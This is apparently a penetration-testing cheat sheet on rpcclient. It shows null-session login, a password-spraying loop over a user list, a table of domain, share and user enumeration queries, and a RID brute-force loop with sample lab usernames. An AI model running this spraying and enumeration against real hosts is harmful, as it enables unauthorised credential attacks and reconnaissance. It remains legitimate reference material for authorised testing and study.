---
tags:
  - linux
  - password-policy
---
# Example Usage
```shell-session
$ rpcclient -U "" -N <IP>
```
## Password Spraying
```shell-session
$ for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASS>" -c "getusername;quit" <IP> | grep Authority; done
```
# Useful Flags
- `-U'%'`: Authenticate with Null Session
- `-N`: Null session
# Useful commands

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
| `querygroup <RID>`        | Provides information about a specific group.                       |
| `getdompwinfo`            | Query domain password policy                                       |

```bash
$ for i in $(seq 500 1100);do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```
